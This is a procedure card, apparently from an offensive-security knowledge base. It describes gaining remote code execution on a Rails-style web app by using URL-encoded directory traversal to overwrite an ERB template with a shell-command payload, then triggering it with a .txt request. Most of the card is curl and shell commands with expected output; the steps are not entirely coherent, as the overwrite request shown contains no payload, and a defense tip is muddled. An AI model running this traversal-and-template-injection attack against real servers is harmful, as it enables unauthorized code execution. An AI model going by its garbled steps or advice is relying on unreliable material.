---
tags:
  - rce
  - erb-overwrite
type: procedure
tools:
  - '[[tools/curl]]'
  - '[[tools/cat]]'
  - '[[tools/ls]]'
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/curl-traversal-erb-overwrite]]'
  - '[[commands/cat-erb-template]]'
  - '[[commands/curl-trigger-rce]]'
  - '[[commands/ls-after-rce]]'
verified: false
platforms:
  - Web
  - Linux
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Command-Line Interface]]'
updated_at: '2025-12-14T17:26:27.459Z'
skill_level: advanced
impact_level: high
detection_risk: high
sub_techniques: []
id: ebc7213e-0524-4a28-9622-0a6e123a6d6c
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Command-Line Interface]]'
---
# Achieve-RCE-by-Overwriting-ERB-Template

## Summary

This procedure uses directory traversal to overwrite an ERB template (show.text.erb) with malicious code containing a system command, then accesses the template in text format to execute the code, achieving RCE.

## Description

ERB templates render dynamically; overwriting with <% `touch me` %> allows command injection when rendered without HTML escaping (text format). The template must exist or be creatable. Traversal path: /books/1%2f%2e%2e%2f...%2fapp%2fviews%2fbooks%2fshow%2etext%2eerb?format=text. Execution via /books/1.txt.

## Requirements

1. Running server with vulnerable caching
2. show.text.erb template present (generate if needed: name: <%= @book.name %>)
3. Write access to app/views

## Defense

Defensive measures and detection strategies:

- Restrict template directories from web writes
- Use safe ERB rendering with html_safe false
- Monitor for ERB file modifications and anomalous executions

## Objectives

1. Inject executable code into template
2. Trigger rendering to execute command

## Instructions

### Step 1: Overwrite ERB Template

**Context**: Use traversal to write malicious content.

**Command** ([[commands/curl-traversal-erb-overwrite]]):
```bash
curl "http://localhost:3000/books/1%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fapp%2fviews%2fbooks%2fshow%2etext%2eerb?format=text"
```

> Overwrites with unescaped payload. Expected: Template updated.

**Command** ([[commands/cat-erb-template]]):
```bash
cat app/views/books/show.text.erb
```

> Verifies: name: <% `touch me` %>. Expected: Malicious ERB.

### Step 2: Trigger RCE

**Context**: Render in text format to execute.

**Command** ([[commands/curl-trigger-rce]]):
```bash
curl "http://localhost:3000/books/1.txt"
```

> Executes touch me. Expected: Text response, 'me' file created.

**Command** ([[commands/ls-after-rce]]):
```bash
ls
```

> Shows 'me'. Expected: New file from command.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[Exploit Public-Facing Application]]
- [[Command-Line Interface]]

### Sub-Techniques


## Commands Used

- [[commands/curl-traversal-erb-overwrite]]
- [[commands/cat-erb-template]]
- [[commands/curl-trigger-rce]]
- [[commands/ls-after-rce]]

## Tools Used

- [[tools/curl]]
- [[tools/cat]]
- [[tools/ls]]

## Tags

- rce
- erb-overwrite
